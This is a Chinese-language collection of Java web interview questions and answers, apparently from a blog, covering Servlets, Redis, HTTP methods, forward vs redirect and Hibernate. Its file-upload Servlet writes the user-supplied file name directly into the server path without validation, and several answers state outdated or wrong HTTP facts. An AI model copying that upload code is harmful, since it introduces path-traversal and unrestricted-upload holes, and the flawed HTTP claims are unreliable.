请问使用Servlet如何获取用户提交的查询参数以及表单数据？可以通过请求对象（HttpServletRequest）的getParameter()方法通过参数名获得参数值。如果有包含多个值的参数（例如复选框），可以通过请求对象的getParameterValues()方法获得。当然也可以通过请求对象的getParameterMap()获得一个参数名和参数值的映射（Map）。 服务器收到用户提交的表单数据，请问调用了以下方法中的哪一个方法？第一个是Servlet中的doGet()方法，第二个Servlet中的是doPost()方法HTML的元素有一个method属性，用来指定提交表单的方式，其值可以是get或post。我们自定义的Servlet一般情况下会重写doGet()或doPost()两个方法之一或全部，如果是GET请求就调用doGet()方法，如果是POST请求就调用doPost()方法，那为什么为什么这样呢？我们自定义的Servlet通常继承自HttpServlet，HttpServlet继承自GenericServlet并重写了其中的service()方法，这个方法是Servlet接口中定义的。HttpServlet重写的service()方法会先获取用户请求的方法，然后根据请求方法调用doGet()、doPost()、doPut()、doDelete()等方法，如果在自定义Servlet中重写了这些方法，那么显然会调用重写过的（自定义的）方法，这显然是对模板方法模式的应用（如果不理解，请参考阎宏博士的《Java与模式》一书的第37章）。当然，自定义Servlet中也可以直接重写service()方法，那么不管是哪种方式的请求，都可以通过自己的代码进行处理，这对于不区分请求方法的场景比较合适。 请问如何在基于Java的Web项目中实现文件上传和下载？在Sevlet 3 以前，Servlet API中没有支持上传功能的API，因此要实现上传功能需要引入第三方工具从POST请求中获得上传的附件或者通过自行处理输入流来获得上传的文件，我们推荐使用Apache的commons-fileupload。从Servlet 3开始，文件上传变得简单许多。 123456789101112131415161718192021222324252627282930313233343536373839404142packagecom.jackfrued.servlet; import java.io.IOException; import javax.servlet.ServletException; import javax.servlet.annotation.MultipartConfig; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.Part; @WebServlet(\"/UploadServlet\") @MultipartConfig public class UploadServlet extends HttpServlet &#123; private static final long serialVersionUID = 1L; protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // 可以用request.getPart()方法获得名为photo的上传附件 // 也可以用request.getParts()获得所有上传附件（多文件上传） // 然后通过循环分别处理每一个上传的文件 Part part = request.getPart(\"photo\"); if (part != null &amp;&amp;part.getSubmittedFileName().length() &gt; 0) &#123; // 用ServletContext对象的getRealPath()方法获得上传文件夹的绝对路径 StringsavePath = request.getServletContext().getRealPath(\"/upload\"); // Servlet3.1规范中可以用Part对象的getSubmittedFileName()方法获得上传的文件名 // 更好的做法是为上传的文件进行重命名（避免同名文件的相互覆盖） part.write(savePath + \"/\" + part.getSubmittedFileName()); request.setAttribute(\"hint\", \"Upload Successfully!\"); &#125; else &#123; request.setAttribute(\"hint\",\"Upload failed!\"); &#125; // 跳转回到上传页面 request.getRequestDispatcher(\"index.jsp\").forward(request, response); &#125; &#125; 说明一下Servlet 3中的异步处理指的是什么？在Servlet 3中引入了一项新的技术可以让Servlet异步处理请求。有人可能会质疑，既然都有多线程了，还需要异步处理请求吗？答案是肯定的，因为如果一个任务处理时间相当长，那么Servlet或Filter会一直占用着请求处理线程直到任务结束，随着并发用户的增加，容器将会遭遇线程超出的风险，这这种情况下很多的请求将会被堆积起来而后续的请求可能会遭遇拒绝服务，直到有资源可以处理请求为止。异步特性可以帮助应用节省容器中的线程，特别适合执行时间长而且用户需要得到结果的任务，如果用户不需要得到结果则直接将一个Runnable对象交给Executor并立即返回即可。 12345678910111213141516171819202122232425262728293031323334importjava.io.IOException; import javax.servlet.AsyncContext; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; @WebServlet(urlPatterns = &#123;\"/async\"&#125;, asyncSupported = true) public class AsyncServlet extends HttpServlet &#123; private static final long serialVersionUID = 1L; @Override public void doGet(HttpServletRequest req,HttpServletResponse resp) throwsServletException, IOException &#123; // 开启Tomcat异步Servlet支持 req.setAttribute(\"org.apache.catalina.ASYNC_SUPPORTED\", true); final AsyncContext ctx =req.startAsync(); // 启动异步处理的上下文 // ctx.setTimeout(30000); ctx.start(new Runnable() &#123; @Override public voidrun() &#123; // 在此处添加异步处理的代码 ctx.complete(); &#125; &#125;); &#125; &#125; 说说Servlet接口中有哪些方法？Servlet接口定义了5个方法，其中前三个方法与Servlet生命周期相关：- void init(ServletConfig config) throws ServletException- void service(ServletRequest req, ServletResponse resp) throws ServletException, java.io.IOException- void destory()- java.lang.String getServletInfo()- ServletConfig getServletConfig()Web容器加载Servlet并将其实例化后，Servlet生命周期开始，容器运行其init()方法进行Servlet的初始化；请求到达时调用Servlet的service()方法，service()方法会根据需要调用与请求对应的doGet或doPost等方法；当服务器关闭或项目被卸载时服务器会将Servlet实例销毁，此时会调用Servlet的destroy()方法。 阐述一下阐述Servlet和CGI的区别? Servlet与CGI的区别在于Servlet处于服务器进程中，它通过多线程方式运行其service()方法，一个实例可以服务于多个请求，并且其实例一般不会销毁，而CGI对每个请求都产生新的进程，服务完成后就销毁，所以效率上低于Servlet。 在Servlet执行的过程中，一般实现哪几个方法？public void init(ServletConfig config)public ServletConfig getServletConfig()public String getServletInfo()public void service(ServletRequest request,ServletResponse response) public void destroy()init ()方法在servlet的生命周期中仅执行一次，在服务器装载servlet时执行。缺省的init()方法通常是符合要求的，不过也可以根据需要进行 override，比如管理服务器端资源，一次性装入GIF图像，初始化数据库连接等，缺省的inti()方法设置了servlet的初始化参数，并用它的ServeltConfig对象参数来启动配置，所以覆盖init()方法时，应调用super.init()以确保仍然执行这些任务。service ()方法是servlet的核心，在调用service()方法之前，应确保已完成init()方法。对于HttpServlet，每当客户请求一个HttpServlet对象，该对象的service()方法就要被调用，HttpServlet缺省的service()方法的服务功能就是调用与 HTTP请求的方法相应的do功能，doPost()和doGet()，所以对于HttpServlet，一般都是重写doPost()和doGet() 方法。destroy()方法在servlet的生命周期中也仅执行一次，即在服务器停止卸载servlet时执行，把servlet作为服务器进程的一部分关闭。缺省的destroy()方法通常是符合要求的，但也可以override，比如在卸载servlet时将统计数字保存在文件中，或是关闭数据库连接getServletConfig()方法返回一个servletConfig对象，该对象用来返回初始化参servletContext。servletContext接口提供有关servlet的环境信息。getServletInfo()方法提供有关servlet的信息，如作者，版本，版权。 请说出Servlet的生命周期是什么样的？并且请分析一下Servlet和CGI的区别。 Servlet被服务器实例化后，容器运行其init方法，请求到达时运行其service方法，service方法自动派遣运行与请求对应的doXXX方法（doGet，doPost）等，当服务器决定将实例销毁的时候调用其destroy方法。与cgi的区别在于servlet处于服务器进程中，它通过多线程方式运行其service方法，一个实例可以服务于多个请求，并且其实例一般不会销毁，而CGI对每个请求都产生新的进程，服务完成后就销毁，所以效率上低于servlet。 回答一下servlet的生命周期是什么。servlet是否为单例以及原因是什么？Servlet 生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程： Servlet 通过调用 init () 方法进行初始化。 Servlet 调用 service() 方法来处理客户端的请求。 Servlet 通过调用 destroy() 方法终止（结束）。 最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。 Servlet单实例，减少了产生servlet的开销； 简要说明一下forward与redirect区别，并且说一下你知道的状态码都有哪些？以及redirect的状态码又是多少？1.从地址栏显示来说 forward是服务器请求资源,服务器直接访问目标地址的URL,把那个URL的响应内容读取过来,然后把这些内容再发给浏览器.浏览器根本不知道服务器发送的内容从哪里来的,所以它的地址栏还是原来的地址. redirect是服务端根据逻辑,发送一个状态码,告诉浏览器重新去请求那个地址.所以地址栏显示的是新的URL. 2.从数据共享来说 forward:转发页面和转发到的页面可以共享request里面的数据. redirect:不能共享数据. 3.从运用地方来说 forward:一般用于用户登陆的时候,根据角色转发到相应的模块. redirect:一般用于用户注销登陆时返回主页面和跳转到其它的网站等. 4.从效率来说 forward:高. redirect:低. redirect的状态码是302 请问redis的List能在什么场景下使用？ Redis 中list的数据结构实现是双向链表，所以可以非常便捷的应用于消息队列（生产者 / 消费者模型）。消息的生产者只需要通过lpush将消息放入 list，消费者便可以通过rpop取出该消息，并且可以保证消息的有序性。如果需要实现带有优先级的消息队列也可以选择sorted set。而pub/sub功能也可以用作发布者 / 订阅者模型的消息。 分别介绍一下aof和rdb都有哪些优点？以及两者有何区别？RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照（point-in-time snapshot）。 AOF 持久化记录服务器执行的所有写操作命令，并在服务器启动时，通过重新执行这些命令来还原数据集。 AOF 文件中的命令全部以 Redis 协议的格式来保存，新命令会被追加到文件的末尾。 Redis 还可以在后台对 AOF 文件进行重写（rewrite），使得 AOF 文件的体积不会超出保存数据集状态所需的实际大小。Redis 还可以同时使用 AOF 持久化和 RDB 持久化。 在这种情况下， 当 Redis 重启时， 它会优先使用 AOF 文件来还原数据集， 因为 AOF 文件保存的数据集通常比 RDB 文件所保存的数据集更完整。你甚至可以关闭持久化功能，让数据只在服务器运行时存在。 RDB 的优点: RDB 是一个非常紧凑（compact）的文件，它保存了 Redis 在某个时间点上的数据集。 这种文件非常适合用于进行备份： 比如说，你可以在最近的 24 小时内，每小时备份一次 RDB 文件，并且在每个月的每一天，也备份一个 RDB 文件。 这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。RDB 非常适用于灾难恢复（disaster recovery）：它只有一个文件，并且内容都非常紧凑，可以（在加密后）将它传送到别的数据中心，或者亚马逊 S3 中。RDB 可以最大化 Redis 的性能：父进程在保存 RDB 文件时唯一要做的就是 fork 出一个子进程，然后这个子进程就会处理接下来的所有保存工作，父进程无须执行任何磁盘 I/O 操作。RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。 RDB 的缺点: 如果你需要尽量避免在服务器故障时丢失数据，那么 RDB 不适合你。 虽然 Redis 允许你设置不同的保存点（save point）来控制保存 RDB 文件的频率， 但是， 因为RDB 文件需要保存整个数据集的状态， 所以它并不是一个轻松的操作。 因此你可能会至少 5 分钟才保存一次 RDB 文件。 在这种情况下， 一旦发生故障停机， 你就可能会丢失好几分钟的数据。每次保存 RDB 的时候，Redis 都要 fork() 出一个子进程，并由子进程来进行实际的持久化工作。 在数据集比较庞大时， fork() 可能会非常耗时，造成服务器在某某毫秒内停止处理客户端； 如果数据集非常巨大，并且 CPU 时间非常紧张的话，那么这种停止时间甚至可能会长达整整一秒。 虽然 AOF 重写也需要进行 fork() ，但无论 AOF 重写的执行间隔有多长，数据的耐久性都不会有任何损失。 AOF 的优点: 使用 AOF 持久化会让 Redis 变得非常耐久（much more durable）：你可以设置不同的 fsync 策略，比如无 fsync ，每秒钟一次 fsync ，或者每次执行写入命令时 fsync 。 AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。AOF 文件是一个只进行追加操作的日志文件（append only log）， 因此对 AOF 文件的写入不需要进行 seek ， 即使日志因为某些原因而包含了未写入完整的命令（比如写入时磁盘已满，写入中途停机，等等）， redis-check-aof 工具也可以轻易地修复这种问题。 Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写： 重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生停机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作。AOF 文件有序地保存了对数据库执行的所有写入操作， 这些写入操作以 Redis 协议的格式保存， 因此 AOF 文件的内容非常容易被人读懂， 对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单： 举个例子， 如果你不小心执行了 FLUSHALL 命令， 但只要 AOF 文件未被重写， 那么只要停止服务器， 移除 AOF 文件末尾的 FLUSHALL 命令， 并重启 Redis ， 就可以将数据集恢复到 FLUSHALL 执行之前的状态。 AOF 的缺点: 对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。AOF 在过去曾经发生过这样的 bug ： 因为个别命令的原因，导致 AOF 文件在重新载入时，无法将数据集恢复成保存时的原样。 （举个例子，阻塞命令 BRPOPLPUSH 就曾经引起过这样的 bug 。） 测试套件里为这种情况添加了测试： 它们会自动生成随机的、复杂的数据集， 并通过重新载入这些数据来确保一切正常。 虽然这种 bug 在 AOF 文件中并不常见， 但是对比来说， RDB 几乎是不可能出现这种 bug 的。 缓存的优点是什么？ 优点： 1、减少了对数据库的读操作，数据库的压力降低 2、加快了响应速度 redis为什么是单线程？ 因为CPU不是Redis的瓶颈。Redis的瓶颈最有可能是机器内存或者网络带宽。既然单线程容易实现，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了。缺点：服务器其他核闲置。 为什么 redis 读写速率快、性能好？Redis是纯内存数据库，相对于读写磁盘，读写内存的速度就不是几倍几十倍了，一般，hash查找可以达到每秒百万次的数量级。 多路复用IO，“多路”指的是多个网络连接，“复用”指的是复用同一个线程。采用多路 I/O 复用技术可以让单个线程高效的处理多个连接请求（尽量减少网络IO的时间消耗）。可以直接理解为：单线程的原子操作，避免上下文切换的时间和性能消耗；加上对内存中数据的处理速度，很自然的提高redis的吞吐量。 redis的主从复制怎么做的？第一阶段：与master建立连接 第二阶段：向master发起同步请求（SYNC） 第三阶段：接受master发来的RDB数据 第四阶段：载入RDB文件 什么是DAO模式？DAO（Data Access Object）顾名思义是一个为数据库或其他持久化机制提供了抽象接口的对象，在不暴露底层持久化方案实现细节的前提下提供了各种数据访问操作。在实际的开发中，应该将所有对数据源的访问操作进行抽象化后封装在一个公共API中。用程序设计语言来说，就是建立一个接口，接口中定义了此应用程序中将会用到的所有事务方法。在这个应用程序中，当需要和数据源进行交互的时候则使用这个接口，并且编写一个单独的类来实现这个接口，在逻辑上该类对应一个特定的数据存储。DAO模式实际上包含了两个模式，一是Data Accessor（数据访问器），二是Data Object（数据对象），前者要解决如何访问数据的问题，而后者要解决的是如何用对象封装数据。 MVC的各个部分都有那些技术来实现?如何实现?MVC 是Model－View－Controller的简写。 ”Model” 代表的是应用的业务逻辑（通过JavaBean，EJB组件实现）， “View” 是应用的表示面，用于与用户的交互（由JSP页面产生）， ”Controller” 是提供应用的处理过程控制（一般是一个Servlet），通过这种设计模型把应用逻辑，处理过程和显示逻辑分成不同的组件实现。这些组件可以进行交互和重用。model层实现系统中的业务逻辑，view层用于与用户的交互，controller层是model与view之间沟通的桥梁，可以分派用户的请求并选择恰当的视图以用于显示，同时它也可以解释用户的输入并将它们映射为模型层可执行的操作。 使用标签库有什么好处？如何自定义JSP标签？使用标签库的好处包括以下几个方面：- 分离JSP页面的内容和逻辑，简化了Web开发；- 开发者可以创建自定义标签来封装业务逻辑和显示逻辑；- 标签具有很好的可移植性、可维护性和可重用性；- 避免了对Scriptlet（小脚本）的使用（很多公司的项目开发都不允许在JSP中书写小脚本） 编写一个Java类实现实现Tag/BodyTag/IterationTag接口（开发中通常不直接实现这些接口而是继承TagSupport/BodyTagSupport/SimpleTagSupport类，这是对缺省适配模式的应用），重写doStartTag()、doEndTag()等方法，定义标签要完成的功能：- 编写扩展名为tld的标签描述文件对自定义标签进行部署，tld文件通常放在WEB-INF文件夹下或其子目录中- 在JSP页面中使用taglib指令引用该标签库 说说你做过的项目中，使用过哪些JSTL标签？项目中主要使用了JSTL的核心标签库，包括、、、、等，主要用于构造循环和分支结构以控制显示逻辑。 虽然JSTL标签库提供了core、sql、fmt、xml等标签库，但是实际开发中建议只使用核心标签库（core），而且最好只使用分支和循环标签并辅以表达式语言（EL），这样才能真正做到数据显示和业务逻辑的分离，这才是最佳实践。 说说你对get和post请求，并且说说它们之间的区别？①get请求用来从服务器上获得资源，而post是用来向服务器提交数据；②get将表单中数据按照name=value的形式，添加到action 所指向的URL 后面，并且两者使用”?”连接，而各个变量之间使用”&amp;”连接；post是将表单中的数据放在HTTP协议的请求头或消息体中，传递到action所指向URL；③get传输的数据要受到URL长度限制（1024字节）；而post可以传输大量的数据，上传文件通常要使用post方式；④使用get时参数会显示在地址栏上，如果这些数据不是敏感数据，那么可以使用get；对于敏感数据还是应用使用post；⑤get使用MIME类型application/x-www-form-urlencoded的URL编码（也叫百分号编码）文本的格式传递参数，保证被传送的参数由遵循规范的文本组成，例如一个空格的编码是”%20”。 转发和重定向 之间的区别？forward是容器中控制权的转向，是服务器请求资源，服务器直接访问目标地址的URL，把那个URL 的响应内容读取过来，然后把这些内容再发给浏览器，浏览器根本不知道服务器发送的内容是从哪儿来的，所以它的地址栏中还是原来的地址。redirect就是服务器端根据逻辑，发送一个状态码，告诉浏览器重新去请求那个地址，因此从浏览器的地址栏中可以看到跳转后的链接地址，很明显redirect无法访问到服务器保护起来资源，但是可以从一个网站redirect到其他网站。forward更加高效，所以在满足需要时尽量使用forward（通过调用RequestDispatcher对象的forward()方法，该对象可以通过ServletRequest对象的getRequestDispatcher()方法获得），并且这样也有助于隐藏实际的链接；在有些情况下，比如需要访问一个其它服务器上的资源，则必须使用重定向（通过HttpServletResponse对象调用其sendRedirect()方法实现）。 get和post的区别？（1）在客户端， Get 方式在通过 URL 提交数据，数据 在URL中可以看到；POST方式，数据放置在HTML HEADER内提交。 （2）GET方式提交的数据最多只能有1024字节，而POST则没有此限制。 （3）安全性问题。正如在（ 1 ）中提到，使用 Get 的时候，参数会显示在地址栏上，而 Post 不会。所以，如果这些数据是中文数据而且是非敏感数据，那么使用 get ；如果用户输入的数据不是中文字符而且包含敏感数据，那么还是使用 post 为好。 安全的和幂等的。所谓安全的意味着该操作用于获取信息而非修改信息。幂等的意味着对同一 URL 的多个请求应该返回同样的结果。完整的定义并不像看起来那样严格。换句话说， GET 请求一般不应产生副作用。从根本上讲，其目标是当用户打开一个链接时，她可以确信从自身的角度来看没有改变资源。比如，新闻站点的头版不断更新。虽然第二次请求会返回不同的一批新闻，该操作仍然被认为是安全的和幂等的，因为它总是返回当前的新闻。反之亦然。 POST 请求就不那么轻松了。 POST 表示可能改变服务器上的资源的请求。仍然以新闻站点为例，读者对文章的注解应该通过 POST 请求实现，因为在注解提交之后站点已经不同了（比方说文章下面出现一条注解）。 请对以下在J2EE中常用的名词进行解释(或简单描述) web 容器：给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，使JSP,SERVLET直接和容器中的环境变量接接口互，不必关注其它系统问题。主要有WEB服务器来实现。例如：TOMCAT,WEBLOGIC,WEBSPHERE等。该容器提供的接口严格遵守J2EE规范中的WEBAPPLICATION 标准。我们把遵守以上标准的WEB服务器就叫做J2EE中的WEB容器。Web container：实现J2EE体系结构中Web组件协议的容器。这个协议规定了一个Web组件运行时的环境，包括安全，一致性，生命周期管理，事务，配置和其它的服务。一个提供和JSP和J2EE平台APIs界面相同服务的容器。一个Web container 由Web服务器或者J2EE服务器提供。EJB容器：Enterprise java bean 容器。更具有行业领域特色。他提供给运行在其中的组件EJB各种管理功能。只要满足J2EE规范的EJB放入该容器，马上就会被容器进行高效率的管理。并且可以通过现成的接口来获得系统级别的服务。例如邮件服务、事务管理。一个实现了J2EE体系结构中EJB组件规范的容器。这个规范指定了一个Enterprise bean的运行时环境，包括安全，一致性，生命周期，事务，配置，和其他的服务。JNDI：（Java Naming &amp; Directory Interface）JAVA命名目录服务。主要提供的功能是：提供一个目录系统，让其它各地的应用程序在其上面留下自己的索引，从而满足快速查找和定位分布式应用程序的功能。JMS：（Java Message Service）JAVA消息服务。主要实现各个应用程序之间的通讯。包括点对点和广播。JTA：（Java Transaction API）JAVA事务服务。提供各种分布式事务服务。应用程序只需调用其提供的接口即可。JAF：（Java Action FrameWork）JAVA安全认证框架。提供一些安全控制方面的框架。让开发者通过各种部署和自定义实现自己的个性安全控制策略。RMI/IIOP: （Remote Method Invocation /internet对象请求中介协议）他们主要用于通过远程调用服务。例如，远程有一台计算机上运行一个程序，它提供股票分析服务，我们可以在本地计算机上实现对其直接调用。当然这是要通过一定的规范才能在异构的系统之间进行通信。RMI是JAVA特有的。RMI-IIOP出现以前，只有RMI和 CORBA两种选择来进行分布式程序设计。RMI-IIOP综合了RMI和CORBA的优点，克服了他们的缺点，使得程序员能更方便的编写分布式程序设计，实现分布式计算。首先，RMI-IIOP综合了RMI的简单性和CORBA的多语言性（兼容性），其次RMI-IIOP克服了RMI只能用于Java 的缺点和CORBA的复杂性。 网站在架构上应当考虑哪些问题？ - 分层：分层是处理任何复杂系统最常见的手段之一，将系统横向切分成若干个层面，每个层面只承担单一的职责，然后通过下层为上层提供的基础设施和服务以及上层对下层的调用来形成一个完整的复杂的系统。计算机网络的开放系统互联参考模型（OSI/RM）和Internet的TCP/IP模型都是分层结构，大型网站的软件系统也可以使用分层的理念将其分为持久层（提供数据存储和访问服务）、业务层（处理业务逻辑，系统中最核心的部分）和表示层（系统交互、视图展示）。需要指出的是：（1）分层是逻辑上的划分，在物理上可以位于同一设备上也可以在不同的设备上部署不同的功能模块，这样可以使用更多的计算资源来应对用户的并发访问；（2）层与层之间应当有清晰的边界，这样分层才有意义，才更利于软件的开发和维护。- 分割：分割是对软件的纵向切分。我们可以将大型网站的不同功能和服务分割开，形成高内聚低耦合的功能模块（单元）。在设计初期可以做一个粗粒度的分割，将网站分割为若干个功能模块，后期还可以进一步对每个模块进行细粒度的分割，这样一方面有助于软件的开发和维护，另一方面有助于分布式的部署，提供网站的并发处理能力和功能的扩展。- 分布式：除了上面提到的内容，网站的静态资源（JavaScript、CSS、图片等）也可以采用独立分布式部署并采用独立的域名，这样可以减轻应用服务器的负载压力，也使得浏览器对资源的加载更快。数据的存取也应该是分布式的，传统的商业级关系型数据库产品基本上都支持分布式部署，而新生的NoSQL产品几乎都是分布式的。当然，网站后台的业务处理也要使用分布式技术，例如查询索引的构建、数据分析等，这些业务计算规模庞大，可以使用Hadoop以及MapReduce分布式计算框架来处理。- 集群：集群使得有更多的服务器提供相同的服务，可以更好的提供对并发的支持。- 缓存：所谓缓存就是用空间换取时间的技术，将数据尽可能放在距离计算最近的位置。使用缓存是网站优化的第一定律。我们通常说的CDN、反向代理、热点数据都是对缓存技术的使用。- 异步：异步是实现软件实体之间解耦合的又一重要手段。异步架构是典型的生产者消费者模式，二者之间没有直接的调用关系，只要保持数据结构不变，彼此功能实现可以随意变化而不互相影响，这对网站的扩展非常有利。使用异步处理还可以提高系统可用性，加快网站的响应速度（用Ajax加载数据就是一种异步技术），同时还可以起到削峰作用（应对瞬时高并发）。&amp;quot；能推迟处理的都要推迟处理”是网站优化的第二定律，而异步是践行网站优化第二定律的重要手段。- 冗余：各种服务器都要提供相应的冗余服务器以便在某台或某些服务器宕机时还能保证网站可以正常工作，同时也提供了灾难恢复的可能性。冗余是网站高可用性的重要保证。 hibernate的 save() 和persist() 方法分别是做什么的？有什么区别？Hibernate的对象有三种状态：瞬时态（transient）、持久态（persistent）和游离态（detached），如第135题中的图所示。瞬时态的实例可以通过调用save()、persist()或者saveOrUpdate()方法变成持久态；游离态的实例可以通过调用 update()、saveOrUpdate()、lock()或者replicate()变成持久态。save()和persist()将会引发SQL的INSERT语句，而update()或merge()会引发UPDATE语句。save()和update()的区别在于一个是将瞬时态对象变成持久态，一个是将游离态对象变为持久态。merge()方法可以完成save()和update()方法的功能，它的意图是将新的状态合并到已有的持久化对象上或创建新的持久化对象。对于persist()方法，按照官方文档的说明：① persist()方法把一个瞬时态的实例持久化，但是并不保证标识符被立刻填入到持久化实例中，标识符的填入可能被推迟到flush的时间；② persist()方法保证当它在一个事务外部被调用的时候并不触发一个INSERT语句，当需要封装一个长会话流程的时候，persist()方法是很有必要的；③ save()方法不保证第②条，它要返回标识符，所以它会立即执行INSERT语句，不管是在事务内部还是外部。至于lock()方法和update()方法的区别，update()方法是把一个已经更改过的脱管状态的对象变成持久状态；lock()方法是把一个没有更改过的脱管状态的对象变成持久状态。 什么是Web Service？从表面上看，Web Service就是一个应用程序，它向外界暴露出一个能够通过Web进行调用的API。这就是说，你能够用编程的方法透明的调用这个应用程序，不需要了解它的任何细节，跟你使用的编程语言也没有关系。例如可以创建一个提供天气预报的Web Service，那么无论你用哪种编程语言开发的应用都可以通过调用它的API并传入城市信息来获得该城市的天气预报。之所以称之为Web Service，是因为它基于HTTP协议传输数据，这使得运行在不同机器上的不同应用无须借助附加的、专门的第三方软件或硬件，就可相互交换数据或集成。 SOA（Service-Oriented Architecture，面向服务的架构），SOA是一种思想，它将应用程序的不同功能单元通过中立的契约联系起来，独立于硬件平台、操作系统和编程语言，使得各种形式的功能单元能够更好的集成。显然，Web Service是SOA的一种较好的解决方案，它更多的是一种标准，而不是一种具体的技术。 如何设置请求的编码以及响应内容的类型？通过请求对象（ServletRequest）的setCharacterEncoding(String)方法可以设置请求的编码，其实要彻底解决乱码问题就应该让页面、服务器、请求和响应、Java程序都使用统一的编码，最好的选择当然是UTF-8；通过响应对象（ServletResponse）的setContentType(String)方法可以设置响应内容的类型，当然也可以通过HttpServletResponsed对象的setHeader(String, String)方法来设置。 说明 BS与CS 的联系，还有区别。C/S是Client/Server的缩写。服务器通常采用高性能的PC、工作站或小型机，并采用大型数据库系统，如Oracle、Sybase、Informix或 SQL Server。客户端需要安装专用的客户端软件。B/Ｓ是Brower/Server的缩写，客户机上只要安装一个浏览器（Browser），如Netscape Navigator或Internet Explorer，服务器安装Oracle、Sybase、Informix或 SQL Server等数据库。在这种结构下，用户界面完全通过WWW浏览器实现，一部分事务逻辑在前端实现，但是主要事务逻辑在服务器端实现。浏览器通过Ｗeb Server 同数据库进行数据交互。C/S 与 B/S 区别： 硬件环境不同:C/S 一般建立在专用的网络上, 小范围里的网络环境, 局域网之间再通过专门服务器提供连接和数据交换服务.B/S 建立在广域网之上的, 不必是专门的网络硬件环境,例与电话上网, 租用设备. 信息自己管理. 有比C/S更强的适应范围, 一般只要有操作系统和浏览器就行２．对安全要求不同C/S 一般面向相对固定的用户群, 对信息安全的控制能力很强. 一般高度机密的信息系统采用C/S 结构适宜. 可以通过B/S发布部分可公开信息.B/S 建立在广域网之上, 对安全的控制能力相对弱, 可能面向不可知的用户。３．对程序架构不同C/S 程序可以更加注重流程, 可以对权限多层次校验, 对系统运行速度可以较少考虑.B/S 对安全以及访问速度的多重的考虑, 建立在需要更加优化的基础之上. 比C/S有更高的要求 B/S结构的程序架构是发展的趋势, 从MS的.Net系列的BizTalk 2000 Exchange 2000等, 全面支持网络的构件搭建的系统. SUN 和IBM推的JavaBean 构件技术等,使B/S更加成熟.４．软件重用不同C/S 程序可以不可避免的整体性考虑, 构件的重用性不如在B/S要求下的构件的重用性好.B/S 对的多重结构,要求构件相对独立的功能. 能够相对较好的重用.就入买来的餐桌可以再利用,而不是做在墙上的石头桌子５．系统维护不同C/S 程序由于整体性, 必须整体考察, 处理出现的问题以及系统升级. 升级难. 可能是再做一个全新的系统B/S 构件组成,方面构件个别的更换,实现系统的无缝升级. 系统维护开销减到最小.用户从网上自己下载安装就可以实现升级.６．处理问题不同C/S 程序可以处理用户面固定, 并且在相同区域, 安全要求高需求, 与操作系统相关. 应该都是相同的系统B/S 建立在广域网上, 面向不同的用户群, 分散地域, 这是C/S无法作到的. 与操作系统平台关系最小.７．用户接口不同C/S 多是建立的Window平台上,表现方法有限,对程序员普遍要求较高B/S 建立在浏览器上, 有更加丰富和生动的表现方式与用户交流. 并且大部分难度减低,减低开发成本.８．信息流不同C/S 程序一般是典型的中央集权的机械式处理, 交互性相对低B/S 信息流向可变化, B-B B-C B-G等信息、流向的变化, 更像交易中心。 forward 和redirect的区别？forward是服务器请求资源，服务器直接访问目标地址的URL，把那个URL的响应内容读取过来，然后把这些内容再发给浏览器，浏览器根本不知道服务器发送的内容是从哪儿来的，所以它的地址栏中还是原来的地址。redirect就是服务端根据逻辑,发送一个状态码,告诉浏览器重新去请求那个地址，一般来说浏览器会用刚才请求的所有参数重新请求，所以session,request参数都可以获取。 cookie 和 session 的区别？1、cookie数据存放在客户的浏览器上，session数据放在服务器上。 2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗 考虑到安全应当使用session。 3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，考虑到减轻服务器性能方面，应当使用COOKIE。 4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"MVC","slug":"MVC","date":"2020-07-13T21:43:03.000Z","updated":"2021-04-11T17:11:28.305Z","comments":true,"path":"mvc/","link":"","permalink":"https://kayleh.top/mvc/","excerpt":"MVC","text":"MVC 请谈一下Spring MVC的工作原理是怎样的？①客户端的所有请求都交给前端控制器DispatcherServlet来处理，它会负责调用系统的其他模块来真正处理用户的请求。② DispatcherServlet收到请求后，将根据请求的信息（包括URL、HTTP协议方法、请求头、请求参数、Cookie等）以及HandlerMapping的配置找到处理该请求的Handler（任何一个对象都可以作为请求的Handler）。③在这个地方Spring会通过HandlerAdapter对该处理器进行封装。④ HandlerAdapter是一个适配器，它用统一的接口对各种Handler中的方法进行调用。⑤ Handler完成对用户请求的处理后，会返回一个ModelAndView对象给DispatcherServlet，ModelAndView顾名思义，包含了数据模型以及相应的视图的信息。⑥ ModelAndView的视图是逻辑视图，DispatcherServlet还要借助ViewResolver完成从逻辑视图到真实视图对象的解析工作。⑦ 